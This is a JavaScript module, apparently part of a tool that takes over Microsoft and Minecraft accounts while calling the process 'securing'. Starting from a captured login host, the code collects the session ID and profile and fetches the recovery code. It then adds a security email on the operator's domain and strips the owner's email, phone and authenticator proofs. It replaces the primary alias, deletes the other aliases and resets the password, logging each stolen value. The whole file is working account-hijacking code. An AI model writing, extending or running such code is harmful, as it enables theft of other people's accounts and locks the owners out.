const generate = require("../../utils/generate")
const { domains } = require("../../config.json")
const match = require("./match")
const addAlias = require("./secure/addAlias")
const addEmail = require("./secure/addEmail")
const changePassword = require("./secure/changePassword")
const getAMRP = require("./secure/getAMRP")
const getCookies = require("./secure/getCookies")
const getAliases = require("./secure/getAliases")
const getPasswordParameters = require("./secure/getPasswordParameters")
const getPasswordToken = require("./secure/getPasswordToken")
const getssid = require("./secure/getssid")
const makePrimary = require("./secure/makePrimary")
const recoveryCode = require("./secure/recoveryCode")
const removeAlias = require("./secure/removeAlias")
const removeProof = require("./secure/removeProof")
const removeExploit = require("./secure/removeExploit")
const securityInformation = require("./secure/securityInformation")
const getT = require("./secure/getT")
const polishHost = require("./secure/polishHost")
const changeIgn = require("./secure/changeIgn")
const getProfile = require("./secure/getProfile")
const getxbl = require("./secure/getxbl")

module.exports = async (host, id, settings) => {
  let start = Date.now()
  console.log(`Started securing an account [${id}]!`)
  let acc = {
    oldName: `Couldn't find!`,
    newName: `Couldn't change!`,
    oldEmail: `Couldn't find`,
    email: `Couldn't change!`,
    secEmail: `Couldn't change!`,
    password: `Couldn't change!`,
    recoveryCode: `Couldn't change!`,
    loginCookie: `Couldn't find!`,
    status: `unknown`,
    timeTaken: 0,
    ssid: `Couldn't Get!`
  }
  const [canary, apiCanary, amsc] = await getCookies()
  host = await polishHost(host, amsc, id)
  let xbl = await getxbl(host, id)
  if (xbl) {
    let ssid = await getssid(xbl, id)
    if (ssid) {
      acc.ssid = ssid
      let profile = await getProfile(ssid, id)
      if (profile) {
        acc.oldName = profile.name
        if (settings.change_ign) {
          let newName = profile.name
          if (newName.length < 16) {
            newName += "_"
          } else {
            newName = newName.replace(/.$/, ".")
          }
          changeIgn(ssid, newName, id).then(status => {
            if (status == 200) {
              acc.newName = newName
            } else {
              acc.newName = profile.name
            }
          })
        }
      } else {
        console.log(`[X] Couldn't get profile!`)
      }
    } else {
      console.log(`[X] Couldn't get SSID`)
    }
  } else {
    acc.oldName = `No Xbox Profile!`
    console.log(`[X] Couldn't get XBL`)
  }

  let email = null;

  let t = await getT(host, amsc)

  if (t == "locked") {
    console.log(`Account is locked!`)
    acc.email = `Locked!`
    acc.secEmail = `Locked!`
    acc.recoveryCode = `Locked!`
    acc.password = `Locked!`
  }

  else if (t == "down") {
    console.log(`Microsoft services are down!`)
    acc.email = `Microsoft services are down!`
    acc.secEmail = `Microsoft services are down!`
    acc.recoveryCode = `Microsoft services are down!`
    acc.password = `Microsoft services are down!`
  }

  else {
    let amrp = await getAMRP(t, amsc)
    if (amrp) {
      const securityParameters = await securityInformation(amrp)
      let data = securityParameters?.WLXAccount?.manageProofs
      let recovery = await recoveryCode(amrp, apiCanary, amsc, data?.encryptedNetId)
      if (recovery) {
        acc.recoveryCode = recovery
      } else {
        console.log(`[X] Failed to get the Recovery Code!`)
        acc.recoveryCode = `Failed to get the recovery code!`
      }
      let suc = await removeExploit(amrp, apiCanary, amsc)
      if (!suc) {
        console.log(`[X] Failed to Remove the Exploit!`)
      }
      let s = generate(16) + "@" + domains[0]
      console.log(`[*] Generated ${s} as a Security Smail for this account!`)
      let success = await addEmail(s, amrp, canary)
      if (success) {
        acc.secEmail = s
        if (data?.emailProofs) {
          for (let email of data?.emailProofs) {
            console.log(`[*] Trying to remove email ${email?.displayProofName}`)
            await removeProof(amrp, amsc, apiCanary, email?.proofId)
          }
        }
        if (data?.smsProofs) {
          for (let smsProof of data?.smsProofs) {
            console.log(`[*] Trying to remove phone number ${smsProof.displayProofName}`)
            await removeProof(amrp, amsc, apiCanary, smsProof?.proofId)
          }
        }
        if (data?.msAuthApp) {
          console.log(`Trying to remove authenticator`)
          await removeProof(amrp, amsc, apiCanary, data.msAuthApp.proofId)
        }
      } else {
        console.log(`[X] Failed to add ${s} as a Security Email for this account!`)
        acc.secEmail = `Failed to add!`
      }

      let d = await getAliases(amrp)
      let [aliases, canary2] = d
      console.log(`[*] Aliases for this account: ${aliases.join(" | ")}`)
      let primaryAlias = generate(16)
      let isAdded = await addAlias(primaryAlias, canary2, amrp, amsc)
      if (isAdded) {
        console.log(`[✔] Added alias ${primaryAlias}@outlook.com to the Account!`)
        acc.email = aliases[0]
        email = primaryAlias + "@outlook.com"
        let isPrimary = await makePrimary(amrp, amsc, apiCanary, email)
        if (isPrimary) {
          acc.email = email
          console.log(`[✔] Set ${primaryAlias}@outlook.com as a Primary Alias for the Account!`)
          for (let alias of aliases) {
            if (alias == aliases[0]) continue
            if (alias.includes(primaryAlias)) continue
            await removeAlias(amrp, amsc, canary2, alias)
          }
        } else {
          console.log(`[X] Failed to Set ${primaryAlias}@outlook.com as a Primary Alias for the Account!`)
        }
      } else {
        console.log(`[X] Failed to add ${primaryAlias}@outlook.com as an Alias for the Account!`)
        acc.email = aliases[0]
        email = aliases[0]
      }
      if (acc.secEmail == "Failed to add!") {
        acc.password = `Failed to change!`
      } else if (email && acc.secEmail) {
        let [parameters, mode] = await getPasswordParameters(amsc, canary, email)
        console.log(`[✔] Got the Parameters Required to Change Password [Mode ${mode}]`)
        let signinName, proofs, epid, token = null
        switch (mode) {
          case 1:
            signinName = parameters?.sSigninName
            proofs = parameters?.oProofList
            token = parameters?.sRecoveryToken
            if (isIterable(proofs)) {
              for (let proof of proofs) {
                if (match(proof.name, acc.secEmail)) {
                  epid = proof.epid
                }
              }
            }
            break;
          case 2:
            let data = parameters?.WLXAccount?.resetPassword?.viewContext?.data
            signinName = data?.signinName
            token = data?.token
            proofs = data?.proofList
            if (isIterable(proofs)) {
              for (let proof of proofs) {
                if (match(proof.name, acc.secEmail)) {
                  epid = proof.epid
                }
              }
            }
            break;
          default:
            break;
        }
        if (token && epid && signinName) {
          let passwordToken = await getPasswordToken(amrp, amsc, apiCanary, acc.secEmail, epid, token)
          if (passwordToken) {
            console.log(`[✔] Got Password Token!`)
            let password = generate(16)
            let succe = await changePassword(amrp, amsc, apiCanary, epid, signinName, passwordToken, password)
            if (succe) {
              console.log(`[✔] Changed the Password of the Account Successfully [${password}]`)
              acc.password = password
            } else {
              console.log(`[X] Failed to Change the Password of the Account!`)
            }
          } else {
            console.log(`[X] Failed to Get the Password Token!`)
          }
        }
      }
    } else {
      console.log(`[X] Couldn't find the AMRP`)
    }
  }
  acc.timeTaken = ((Date.now() - start) / 1000).toFixed(1)
  console.log(acc)
  return acc
}
function isIterable(obj) {
  // checks for null and undefined
  if (obj == null) {
    return false;
  }
  return typeof obj[Symbol.iterator] === 'function';
}